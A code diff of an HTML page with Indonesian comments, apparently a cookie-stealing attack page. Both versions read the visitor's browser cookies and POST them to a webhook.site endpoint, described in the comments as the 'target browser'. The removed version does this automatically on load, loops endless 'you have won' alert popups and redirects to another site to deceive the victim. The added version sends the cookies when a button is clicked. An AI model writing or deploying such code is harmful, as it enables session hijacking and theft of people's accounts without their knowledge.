@@ -3,35 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Ekstrak Cookie</title>
 </head>
 <body>
+    <button onclick="ekstrakCookie()">Ekstrak Cookie</button>
+
     <script>
-        // Menonaktifkan proteksi keamanan browser
-        document.cookie = "sameSite=None";
-        document.cookie = "Secure=false";
-        document.cookie = "HttpOnly=false";
+        function ekstrakCookie() {
+            // Mengambil semua cookie yang ada di browser target
+            var semuaCookie = document.cookie;
 
-        // Ambil cookies
-        var cookies = document.cookie;
-        
-        // Kirim cookies ke Webhook.site
-        var webhookURL = 'https://webhook.site/535797ef-1f9c-452a-94ab-633b408224ea'; // Ganti dengan URL endpoint dari Webhook.site
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", webhookURL, true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.send(JSON.stringify({ cookies: cookies }));
-        
-        // Skrip untuk menggoda pengguna dengan pesan yang tidak berhenti muncul
-        function berhentiMuncul() {
-            alert('Anda telah menang!');
-            setTimeout(berhentiMuncul, 500); // Munculkan pesan setiap 0.5 detik
+            // Kirim cookie ke server atau lakukan apapun yang diinginkan
+            // Contoh: Mengirim cookie ke endpoint server menggunakan fetch API
+            fetch('https://webhook.site/535797ef-1f9c-452a-94ab-633b408224ea', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies: semuaCookie })
+            })
+            .then(response => {
+                // Lakukan sesuatu setelah permintaan selesai, jika perlu
+                console.log('Cookie telah berhasil diekstrak dan dikirim.');
+            })
+            .catch(error => {
+                // Tangani kesalahan jika terjadi
+                console.error('Terjadi kesalahan:', error);
+            });
         }
-
-berhentiMuncul(); // Memanggil fungsi untuk memulai pesan yang tidak berhenti muncul
-
-        // Redirect ke halaman yang valid untuk mengelabui target
-        window.location.replace("https://hackprank.com/");
     </script>
 </body>
 </html>
